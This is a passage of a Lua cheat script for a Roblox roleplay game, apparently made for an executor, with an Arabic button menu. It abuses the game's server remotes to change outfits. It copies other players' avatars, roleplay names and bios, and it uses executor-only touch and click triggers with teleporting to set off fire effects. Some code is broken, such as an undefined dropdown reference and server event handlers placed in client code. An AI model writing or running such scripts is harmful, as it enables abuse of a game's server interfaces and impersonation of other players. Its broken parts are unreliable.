        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

local Section = Tab:AddSection({
	Name = "تيشيرتات اولاد"
})

Tab:AddButton({ 	Name  = "تيشيرت ابيض موشم", 	Callback = function()
local args = {
            [1] = 16756099522;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "تيشيرت اسود موشم", 	Callback = function()
local args = {
            [1] = 16690692104;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "تيشيرت باد بوي ويني", 	Callback = function()
local args = {
            [1] = 17490664393;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "تيشيرت باد بوي اسود و رصاصي", 	Callback = function()
local args = {
            [1] = 12938645598;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "تيشيرت باد بوي اسود و احمر", 	Callback = function()
local args = {
            [1] = 12938637969;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

local Section = Tab:AddSection({
	Name = "تيشيرتات بنات"
})

Tab:AddButton({ 	Name  = "تيشيرت اسود موشم", 	Callback = function()
local args = {
            [1] = 16701261333;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "تيشيرت اسود فيه ورود", 	Callback = function()
local args = {
            [1] = 16466139521;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "تيشيرت اسود و ابيض و نجوم", 	Callback = function()
local args = {
            [1] = 16249512832;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "تيشيرت اسود و يحضن كلب", 	Callback = function()
local args = {
            [1] = 17120804100;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "تيشيرت ابيض و يحضن كلب", 	Callback = function()
local args = {
            [1] = 17585438642;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "تيشيرت اسود و يحضن قطه", 	Callback = function()
local args = {
            [1] = 17044246130;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

local Section = Tab:AddSection({
	Name = "سويترات"
})

Tab:AddButton({ 	Name  = "سويتر اسود ديناصور للاولاد", 	Callback = function()
local args = {
            [1] = 12503598247;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "سويتر اسود للاولاد", 	Callback = function()
local args = {
            [1] = 11567575400;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

local Section = Tab:AddSection({
	Name = "تنانير"
})

Tab:AddButton({ 	Name  = "تنوره ورديه", 	Callback = function()
local args = {
            [1] = 15116615569;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

local Section = Tab:AddSection({
	Name = "بنطلونات"
})

Tab:AddButton({ 	Name  = "بنطال Y2K اسود", 	Callback = function()
local args = {
            [1] = 126490351689789;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "بنطال Y2K ابيض", 	Callback = function()
local args = {
            [1] = 80443852619543;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "بنطال اسود و احمر", 	Callback = function()
local args = {
            [1] = 14733928358;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "بنطال جينز سماوي", 	Callback = function()
local args = {
            [1] = 18507527463;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "بنطال جينز اسود", 	Callback = function()
local args = {
            [1] = 18507625481;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "بنطال اسود حلو", 	Callback = function()
local args = {
            [1] = 18667464289;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "بنطال Y2K اسود و ابيض موشم", 	Callback = function()
local args = {
            [1] = 17829216066;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "بنطال اسود ايمو موشم", 	Callback = function()
local args = {
            [1] = 18964450118;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "بنطال اسود زائد بوي", 	Callback = function()
local args = {
            [1] = 17106135964;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "بنطال اسود جينز", 	Callback = function()
local args = {
            [1] = 17278036207;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "بنطال حلو للبنات", 	Callback = function()
local args = {
            [1] = 77787269452920;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

local Tab = Window:MakeTab({"سكنات"})

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Remotes = ReplicatedStorage:WaitForChild("Remotes")

local Target = nil

-- FunÃ§Ã£o para obter os nomes dos jogadores
local function GetPlayerNames()
    local PlayerNames = {}
    for _, player in ipairs(Players:GetPlayers()) do
        table.insert(PlayerNames, player.Name)
    end
    return PlayerNames
end

-- Dropdown de seleÃ§Ã£o de jogador
Tab:AddDropdown({
    Name = "اختر الاعب",
    Options = GetPlayerNames(),
    Default = Target,
    Callback = function(Value)
        Target = Value
    end
})

-- Atualiza opÃ§Ãµes do dropdown quando alguÃ©m entra ou sai
local function UpdateDropdown()
    Dropdown:Refresh(GetPlayerNames(), true)
end

Players.PlayerAdded:Connect(UpdateDropdown)
Players.PlayerRemoving:Connect(UpdateDropdown)

-- BotÃ£o de copiar avatar
Tab:AddButton({
    Name = "نسخ السكن",
    Callback = function()
        if not Target then return end

        local LP = Players.LocalPlayer
        local LChar = LP.Character
        local TPlayer = Players:FindFirstChild(Target)

        if TPlayer and TPlayer.Character then
            local LHumanoid = LChar and LChar:FindFirstChildOfClass("Humanoid")
            local THumanoid = TPlayer.Character:FindFirstChildOfClass("Humanoid")

            if LHumanoid and THumanoid then
                -- RESETAR LOCALPLAYER
                local LDesc = LHumanoid:GetAppliedDescription()

                -- Remover acessÃ³rios, roupas e face atuais
                for _, acc in ipairs(LDesc:GetAccessories(true)) do
                    if acc.AssetId and tonumber(acc.AssetId) then
                        Remotes.Wear:InvokeServer(tonumber(acc.AssetId))
                        task.wait(0.2)
                    end
                end

                if tonumber(LDesc.Shirt) then
                    Remotes.Wear:InvokeServer(tonumber(LDesc.Shirt))
                    task.wait(0.2)
                end

                if tonumber(LDesc.Pants) then
                    Remotes.Wear:InvokeServer(tonumber(LDesc.Pants))
                    task.wait(0.2)
                end

                if tonumber(LDesc.Face) then
                    Remotes.Wear:InvokeServer(tonumber(LDesc.Face))
                    task.wait(0.2)
                end

                -- COPIAR DO JOGADOR ALVO
                local PDesc = THumanoid:GetAppliedDescription()

                -- Enviar partes do corpo
                local argsBody = {
                    [1] = {
                        [1] = PDesc.Torso,
                        [2] = PDesc.RightArm,
                        [3] = PDesc.LeftArm,
                        [4] = PDesc.RightLeg,
                        [5] = PDesc.LeftLeg,
                        [6] = PDesc.Head
                    }
                }
                Remotes.ChangeCharacterBody:InvokeServer(unpack(argsBody))
                task.wait(0.5)

                if tonumber(PDesc.Shirt) then
                    Remotes.Wear:InvokeServer(tonumber(PDesc.Shirt))
                    task.wait(0.3)
                end

                if tonumber(PDesc.Pants) then
                    Remotes.Wear:InvokeServer(tonumber(PDesc.Pants))
                    task.wait(0.3)
                end

                if tonumber(PDesc.Face) then
                    Remotes.Wear:InvokeServer(tonumber(PDesc.Face))
                    task.wait(0.3)
                end

                for _, v in ipairs(PDesc:GetAccessories(true)) do
                    if v.AssetId and tonumber(v.AssetId) then
                        Remotes.Wear:InvokeServer(tonumber(v.AssetId))
                        task.wait(0.3)
                    end
                end

                local SkinColor = TPlayer.Character:FindFirstChild("Body Colors")
                if SkinColor then
                    Remotes.ChangeBodyColor:FireServer(tostring(SkinColor.HeadColor))
                    task.wait(0.3)
                end

                if tonumber(PDesc.IdleAnimation) then
                    Remotes.Wear:InvokeServer(tonumber(PDesc.IdleAnimation))
                    task.wait(0.3)
                end

                -- Nome, bio e cor
                local Bag = TPlayer:FindFirstChild("PlayersBag")
                if Bag then
                    if Bag:FindFirstChild("RPName") and Bag.RPName.Value ~= "" then
                        Remotes.RPNameText:FireServer("RolePlayName", Bag.RPName.Value)
                        task.wait(0.3)
                    end
                    if Bag:FindFirstChild("RPBio") and Bag.RPBio.Value ~= "" then
                        Remotes.RPNameText:FireServer("RolePlayBio", Bag.RPBio.Value)
                        task.wait(0.3)
                    end
                    if Bag:FindFirstChild("RPNameColor") then
                        Remotes.RPNameColor:FireServer("PickingRPNameColor", Bag.RPNameColor.Value)
                        task.wait(0.3)
                    end
                    if Bag:FindFirstChild("RPBioColor") then
                        Remotes.RPNameColor:FireServer("PickingRPBioColor", Bag.RPBioColor.Value)
                        task.wait(0.3)
                    end
                end
            end
        end
    end
})

Tab:AddButton({
    Name = "نسخ اقرب سكن",
    Callback = function()
        local LP = Players.LocalPlayer
        local LChar = LP.Character
        if not LChar or not LChar:FindFirstChild("HumanoidRootPart") then return end

        -- Localizar o jogador mais prÃ³ximo
        local closestPlayer, closestDistance = nil, math.huge
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LP and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                local dist = (LChar.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).Magnitude
                if dist < closestDistance then
                    closestDistance = dist
                    closestPlayer = plr
                end
            end
        end

        -- Usar o jogador mais prÃ³ximo como Target
        if not closestPlayer then return end
        local TPlayer = closestPlayer

        -- (cÃ³digo de cÃ³pia do avatar igual ao seu original, substituindo "Target" por TPlayer.Name)
        -- [REUTILIZA A MESMA LÃ“GICA, SÃ“ TROCA A PARTE DO TARGET]
        local LHumanoid = LChar and LChar:FindFirstChildOfClass("Humanoid")
        local THumanoid = TPlayer.Character:FindFirstChildOfClass("Humanoid")

        if LHumanoid and THumanoid then
            local LDesc = LHumanoid:GetAppliedDescription()

            for _, acc in ipairs(LDesc:GetAccessories(true)) do
                if acc.AssetId and tonumber(acc.AssetId) then
                    Remotes.Wear:InvokeServer(tonumber(acc.AssetId))
                    task.wait(0.2)
                end
            end

            if tonumber(LDesc.Shirt) then
                Remotes.Wear:InvokeServer(tonumber(LDesc.Shirt))
                task.wait(0.2)
            end

            if tonumber(LDesc.Pants) then
                Remotes.Wear:InvokeServer(tonumber(LDesc.Pants))
                task.wait(0.2)
            end

            if tonumber(LDesc.Face) then
                Remotes.Wear:InvokeServer(tonumber(LDesc.Face))
                task.wait(0.2)
            end

            local PDesc = THumanoid:GetAppliedDescription()

            local argsBody = {
                [1] = {
                    [1] = PDesc.Torso,
                    [2] = PDesc.RightArm,
                    [3] = PDesc.LeftArm,
                    [4] = PDesc.RightLeg,
                    [5] = PDesc.LeftLeg,
                    [6] = PDesc.Head
                }
            }
            Remotes.ChangeCharacterBody:InvokeServer(unpack(argsBody))
            task.wait(0.5)

            if tonumber(PDesc.Shirt) then
                Remotes.Wear:InvokeServer(tonumber(PDesc.Shirt))
                task.wait(0.3)
            end

            if tonumber(PDesc.Pants) then
                Remotes.Wear:InvokeServer(tonumber(PDesc.Pants))
                task.wait(0.3)
            end

            if tonumber(PDesc.Face) then
                Remotes.Wear:InvokeServer(tonumber(PDesc.Face))
                task.wait(0.3)
            end

            for _, v in ipairs(PDesc:GetAccessories(true)) do
                if v.AssetId and tonumber(v.AssetId) then
                    Remotes.Wear:InvokeServer(tonumber(v.AssetId))
                    task.wait(0.3)
                end
            end

            local SkinColor = TPlayer.Character:FindFirstChild("Body Colors")
            if SkinColor then
                Remotes.ChangeBodyColor:FireServer(tostring(SkinColor.HeadColor))
                task.wait(0.3)
            end

            if tonumber(PDesc.IdleAnimation) then
                Remotes.Wear:InvokeServer(tonumber(PDesc.IdleAnimation))
                task.wait(0.3)
            end

            local Bag = TPlayer:FindFirstChild("PlayersBag")
            if Bag then
                if Bag:FindFirstChild("RPName") and Bag.RPName.Value ~= "" then
                    Remotes.RPNameText:FireServer("RolePlayName", Bag.RPName.Value)
                    task.wait(0.3)
                end
                if Bag:FindFirstChild("RPBio") and Bag.RPBio.Value ~= "" then
                    Remotes.RPNameText:FireServer("RolePlayBio", Bag.RPBio.Value)
                    task.wait(0.3)
                end
                if Bag:FindFirstChild("RPNameColor") then
                    Remotes.RPNameColor:FireServer("PickingRPNameColor", Bag.RPNameColor.Value)
                    task.wait(0.3)
                end
                if Bag:FindFirstChild("RPBioColor") then
                    Remotes.RPNameColor:FireServer("PickingRPBioColor", Bag.RPBioColor.Value)
                    task.wait(0.3)
                end
            end
        end
    end
})

Tab:AddButton({
    Name = "نسخ سكن عشوائي",
    Callback = function()
        local LP = Players.LocalPlayer
        local LChar = LP.Character
        if not LChar then return end

        -- Escolher um player aleatÃ³rio (exceto o prÃ³prio)
        local otherPlayers = {}
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LP and plr.Character then
                table.insert(otherPlayers, plr)
            end
        end
        if #otherPlayers == 0 then return end

        local TPlayer = otherPlayers[math.random(1, #otherPlayers)]

        -- Mesmo cÃ³digo de cÃ³pia
        local LHumanoid = LChar:FindFirstChildOfClass("Humanoid")
        local THumanoid = TPlayer.Character:FindFirstChildOfClass("Humanoid")
        if LHumanoid and THumanoid then
            local LDesc = LHumanoid:GetAppliedDescription()
            for _, acc in ipairs(LDesc:GetAccessories(true)) do
                if acc.AssetId and tonumber(acc.AssetId) then
                    Remotes.Wear:InvokeServer(tonumber(acc.AssetId))
                    task.wait(0.2)
                end
            end
            if tonumber(LDesc.Shirt) then
                Remotes.Wear:InvokeServer(tonumber(LDesc.Shirt))
                task.wait(0.2)
            end
            if tonumber(LDesc.Pants) then
                Remotes.Wear:InvokeServer(tonumber(LDesc.Pants))
                task.wait(0.2)
            end
            if tonumber(LDesc.Face) then
                Remotes.Wear:InvokeServer(tonumber(LDesc.Face))
                task.wait(0.2)
            end

            local PDesc = THumanoid:GetAppliedDescription()
            local argsBody = {
                [1] = {
                    [1] = PDesc.Torso,
                    [2] = PDesc.RightArm,
                    [3] = PDesc.LeftArm,
                    [4] = PDesc.RightLeg,
                    [5] = PDesc.LeftLeg,
                    [6] = PDesc.Head
                }
            }
            Remotes.ChangeCharacterBody:InvokeServer(unpack(argsBody))
            task.wait(0.5)

            if tonumber(PDesc.Shirt) then
                Remotes.Wear:InvokeServer(tonumber(PDesc.Shirt))
                task.wait(0.3)
            end
            if tonumber(PDesc.Pants) then
                Remotes.Wear:InvokeServer(tonumber(PDesc.Pants))
                task.wait(0.3)
            end
            if tonumber(PDesc.Face) then
                Remotes.Wear:InvokeServer(tonumber(PDesc.Face))
                task.wait(0.3)
            end
            for _, v in ipairs(PDesc:GetAccessories(true)) do
                if v.AssetId and tonumber(v.AssetId) then
                    Remotes.Wear:InvokeServer(tonumber(v.AssetId))
                    task.wait(0.3)
                end
            end

            local SkinColor = TPlayer.Character:FindFirstChild("Body Colors")
            if SkinColor then
                Remotes.ChangeBodyColor:FireServer(tostring(SkinColor.HeadColor))
                task.wait(0.3)
            end
            if tonumber(PDesc.IdleAnimation) then
                Remotes.Wear:InvokeServer(tonumber(PDesc.IdleAnimation))
                task.wait(0.3)
            end

            local Bag = TPlayer:FindFirstChild("PlayersBag")
            if Bag then
                if Bag:FindFirstChild("RPName") and Bag.RPName.Value ~= "" then
                    Remotes.RPNameText:FireServer("RolePlayName", Bag.RPName.Value)
                    task.wait(0.3)
                end
                if Bag:FindFirstChild("RPBio") and Bag.RPBio.Value ~= "" then
                    Remotes.RPNameText:FireServer("RolePlayBio", Bag.RPBio.Value)
                    task.wait(0.3)
                end
                if Bag:FindFirstChild("RPNameColor") then
                    Remotes.RPNameColor:FireServer("PickingRPNameColor", Bag.RPNameColor.Value)
                    task.wait(0.3)
                end
                if Bag:FindFirstChild("RPBioColor") then
                    Remotes.RPNameColor:FireServer("PickingRPBioColor", Bag.RPBioColor.Value)
                    task.wait(0.3)
                end
            end
        end
    end
})

Tab:AddButton({
    Name = "تعديل الانيميشن",
    Callback = function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "SysAdmin UI•",
            Text = "reset to stop animations",
            Icon = "rbxthumb://type=Asset&id=119245873411783&w=150&h=150",
            Duration = 5
        })

        -- Configuração do RemoteEvent
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local AnimationEvent = ReplicatedStorage:FindFirstChild("PlayAnimationEvent") or Instance.new("RemoteEvent")
        AnimationEvent.Name = "PlayAnimationEvent"
        AnimationEvent.Parent = ReplicatedStorage

        -- Função para executar animações no servidor
        AnimationEvent.OnServerEvent:Connect(function(player, animationType)
            local character = player.Character
            if character and character:FindFirstChild("Humanoid") then
                local humanoid = character:FindFirstChild("Humanoid")
                local animation = Instance.new("Animation")
                if animationType == "Backward" then
                    animation.AnimationId = "rbxassetid://10358526981"
                elseif animationType == "Leftward" then
                    animation.AnimationId = "rbxassetid://10404604071"
                elseif animationType == "Rightward" then
                    animation.AnimationId = "rbxassetid://10404627994"
                end

                local animationTrack = humanoid:LoadAnimation(animation)

                if animationType == "Stop" then
                    for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do
                        track:Stop()
                    end
                else
                    animationTrack:Play()
                end
            end
        end)

        -- Configurações
        local AnimationId = "10358526981"
        local LeftwardAnimationId = "10404604071"
        local RightwardAnimationId = "10404627994"
        local Player = game.Players.LocalPlayer
        local Character = Player.Character or Player.CharacterAdded:Wait()
        local Humanoid = Character:WaitForChild("Humanoid")
        local RootPart = Character:WaitForChild("HumanoidRootPart")

        -- Carregar animações
        local BackwardAnimation = Instance.new("Animation")
        BackwardAnimation.AnimationId = "rbxassetid://" .. AnimationId
        local BackwardAnimationTrack = Humanoid:LoadAnimation(BackwardAnimation)

        local LeftwardAnimation = Instance.new("Animation")
        LeftwardAnimation.AnimationId = "rbxassetid://" .. LeftwardAnimationId
        local LeftwardAnimationTrack = Humanoid:LoadAnimation(LeftwardAnimation)

        local RightwardAnimation = Instance.new("Animation")
        RightwardAnimation.AnimationId = "rbxassetid://" .. RightwardAnimationId
        local RightwardAnimationTrack = Humanoid:LoadAnimation(RightwardAnimation)

        -- Variáveis
        local IsPlayingBackward = false
        local IsPlayingLeftward = false
        local IsPlayingRightward = false

        -- Função para detectar movimento e enviar eventos para o servidor
        game:GetService("RunService").RenderStepped:Connect(function()
            if Character and RootPart and Humanoid then
                local moveDirection = Humanoid.MoveDirection
                local characterLook = RootPart.CFrame.LookVector
                local characterRight = RootPart.CFrame.RightVector

                local dotBackward = moveDirection:Dot(characterLook)
                local dotLeftward = moveDirection:Dot(-characterRight)
                local dotRightward = moveDirection:Dot(characterRight)

                -- Andar de costas
                if moveDirection.Magnitude > 0 and dotBackward < -0.5 then
                    if not IsPlayingBackward then
                        IsPlayingBackward = true
                        AnimationEvent:FireServer("Backward")
                        BackwardAnimationTrack:Play()
                    end
                else
                    if IsPlayingBackward then
                        IsPlayingBackward = false
                        AnimationEvent:FireServer("Stop")
                        BackwardAnimationTrack:Stop()
                    end
                end

                -- Andar para a esquerda
                if moveDirection.Magnitude > 0 and dotLeftward > 0.5 then
                    if not IsPlayingLeftward then
                        IsPlayingLeftward = true
                        AnimationEvent:FireServer("Leftward")
                        LeftwardAnimationTrack:Play()
                    end
                else
                    if IsPlayingLeftward then
                        IsPlayingLeftward = false
                        AnimationEvent:FireServer("Stop")
                        LeftwardAnimationTrack:Stop()
                    end
                end

                -- Andar para a direita
                if moveDirection.Magnitude > 0 and dotRightward > 0.5 then
                    if not IsPlayingRightward then
                        IsPlayingRightward = true
                        AnimationEvent:FireServer("Rightward")
                        RightwardAnimationTrack:Play()
                    end
                else
                    if IsPlayingRightward then
                        IsPlayingRightward = false
                        AnimationEvent:FireServer("Stop")
                        RightwardAnimationTrack:Stop()
                    end
                end
            end
        end)
    end
})

Tab:AddButton({
    Name = "بدء الانيميشن",
    Callback = function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "SysAdmin UI•",
            Text = "FE animation started!",
            Icon = "rbxthumb://type=Asset&id=119245873411783&w=150&h=150",
            Duration = 5
        })

        -- Configurações
        local AnimationId = "10358526981" -- ID da animação para andar de costas
        local LeftwardAnimationId = "10404604071" -- ID da animação para andar para o lado esquerdo
        local RightwardAnimationId = "10404627994" -- ID da animação para andar para o lado direito
        local Player = game.Players.LocalPlayer
        local Character = Player.Character or Player.CharacterAdded:Wait()
        local Humanoid = Character:WaitForChild("Humanoid")
        local RootPart = Character:WaitForChild("HumanoidRootPart")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")

        -- RemoteEvent para comunicação com o servidor
        local AnimationEvent = ReplicatedStorage:WaitForChild("PlayAnimationEvent")

        -- Carregar animações
        local BackwardAnimation = Instance.new("Animation")
        BackwardAnimation.AnimationId = "rbxassetid://" .. AnimationId
        local BackwardAnimationTrack = Humanoid:LoadAnimation(BackwardAnimation)

        local LeftwardAnimation = Instance.new("Animation")
        LeftwardAnimation.AnimationId = "rbxassetid://" .. LeftwardAnimationId
        local LeftwardAnimationTrack = Humanoid:LoadAnimation(LeftwardAnimation)

        local RightwardAnimation = Instance.new("Animation")
        RightwardAnimation.AnimationId = "rbxassetid://" .. RightwardAnimationId
        local RightwardAnimationTrack = Humanoid:LoadAnimation(RightwardAnimation)

        -- Variáveis
        local IsPlayingBackward = false
        local IsPlayingLeftward = false
        local IsPlayingRightward = false

        -- Função para detectar movimento e enviar eventos para o servidor
        game:GetService("RunService").RenderStepped:Connect(function()
            if Character and RootPart and Humanoid then
                local moveDirection = Humanoid.MoveDirection
                local characterLook = RootPart.CFrame.LookVector
                local characterRight = RootPart.CFrame.RightVector

                local dotBackward = moveDirection:Dot(characterLook)
                local dotLeftward = moveDirection:Dot(-characterRight)
                local dotRightward = moveDirection:Dot(characterRight)

                -- Detecta andar de costas
                if moveDirection.Magnitude > 0 and dotBackward < -0.5 then
                    if not IsPlayingBackward then
                        IsPlayingBackward = true
                        AnimationEvent:FireServer("Backward")
                        BackwardAnimationTrack:Play()
                    end
                else
                    if IsPlayingBackward then
                        IsPlayingBackward = false
                        AnimationEvent:FireServer("Stop")
                        BackwardAnimationTrack:Stop()
                    end
                end

                -- Detecta andar para o lado esquerdo
                if moveDirection.Magnitude > 0 and dotLeftward > 0.5 then
                    if not IsPlayingLeftward then
                        IsPlayingLeftward = true
                        AnimationEvent:FireServer("Leftward")
                        LeftwardAnimationTrack:Play()
                    end
                else
                    if IsPlayingLeftward then
                        IsPlayingLeftward = false
                        AnimationEvent:FireServer("Stop")
                        LeftwardAnimationTrack:Stop()
                    end
                end

                -- Detecta andar para o lado direito
                if moveDirection.Magnitude > 0 and dotRightward > 0.5 then
                    if not IsPlayingRightward then
                        IsPlayingRightward = true
                        AnimationEvent:FireServer("Rightward")
                        RightwardAnimationTrack:Play()
                    end
                else
                    if IsPlayingRightward then
                        IsPlayingRightward = false
                        AnimationEvent:FireServer("Stop")
                        RightwardAnimationTrack:Stop()
                    end
                end
            end
        end)
    end
})

local Section = Tab:AddSection({"تعديلات الشخصية"})

Tab:AddToggle({
    Name = "تفعيل دخان بالشخصية تلقائيا",
    Default = false,
    Callback = function(Value)
        isActive = Value

        while isActive do
            local mall = workspace:WaitForChild("WorkspaceCom"):WaitForChild("001_Mall"):WaitForChild("001_Pizza"):FindFirstChild("CatchFire")
            
            if mall then
                local touchInterest = mall:FindFirstChild("TouchInterest")
                if touchInterest then
                    firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, mall, 0)
                    wait()
                    firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, mall, 1)
                end
            end
            wait(1)
        end
    end
})

Tab:AddToggle({
    Name = "تفعيل نار بالشخصية تلقائيا",
    Default = false,
    Callback = function(Value)
        isActive = Value

        while isActive do
            local playerName = game.Players.LocalPlayer.Name
            local lotFolder = game:GetService("Workspace"):WaitForChild("001_Lots")
            local house = lotFolder:FindFirstChild(playerName .. "House")

            if house then
                local mall = house:WaitForChild("HousePickedByPlayer"):WaitForChild("HouseModel"):WaitForChild("001_BBQ"):FindFirstChild("CatchFire")
                if mall then
                    local touchInterest = mall:FindFirstChild("TouchInterest")
                    if touchInterest then
                        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, mall, 0)
                        wait()
                        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, mall, 1)
                    end
                end
            else
                warn("House not found for player: " .. playerName)
            end
            wait(1)
        end
    end
})

Tab:AddButton({
    Name = "تفعيل يد نارية تلقائيا",
    Callback = function()
        local Player = game.Players.LocalPlayer
        local Character = Player.Character
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Character:FindFirstChild("HumanoidRootPart")
        local OldPos = RootPart.CFrame
        
        local function freezeHumanoid(humanoid)
            humanoid.WalkSpeed = 0
            humanoid.JumpPower = 0
        end
        
        local function restoreHumanoid(humanoid)
            humanoid.WalkSpeed = 16
            humanoid.JumpPower = 50
        end
        
        local firstPosition = CFrame.new(-349, 5, 98)
        
        local PoolClick = workspace.WorkspaceCom["001_Hospital"]:FindFirstChild("PoolClick")
        
        if PoolClick and PoolClick:FindFirstChild("ClickDetector") then
            freezeHumanoid(Humanoid)
            RootPart.CFrame = firstPosition
            task.wait(1)
            RootPart.CFrame = PoolClick.CFrame
            fireclickdetector(PoolClick.ClickDetector)
            task.wait(2)
            RootPart.CFrame = OldPos
            restoreHumanoid(Humanoid)
        else
            warn("PoolClick ou ClickDetector não encontrado!")
        end
    end
})

local Section = Tab:AddSection({
	Name = "سكنات بنات"
})

Tab:AddButton({ 	Name  = "سكن بنت 0", 	Callback = function()
local args = {
    [1] = "OCA";
}

game:GetService("ReplicatedStorage"):WaitForChild("RE", 9e9):WaitForChild("1Avata1rOrigina1l", 9e9):FireServer(unpack(args))
  wait(0.2)
  local args = {
    [1] = 104558184738792
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 110138817602297
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 78625340992085
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 133739083878132
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 15936091685
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = 14960720067
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 11137846401
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 91764783976162
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 13900309877
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))
wait(0.4)
local args = {
    [1] = {
        [1] = 115745153758680,
        [2] = 76683091425509,
        [3] = 75159926897589,
        [4] = 0,
        [5] = 0,
        [6] = 1
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

wait(0.3)
local args = {
    [1] = 9068015167
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))
wait(0.2)
local args = {
    [1] = 8428878750
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))
wait(0.4)
local args = {
    [1] = "Institutional white"
}

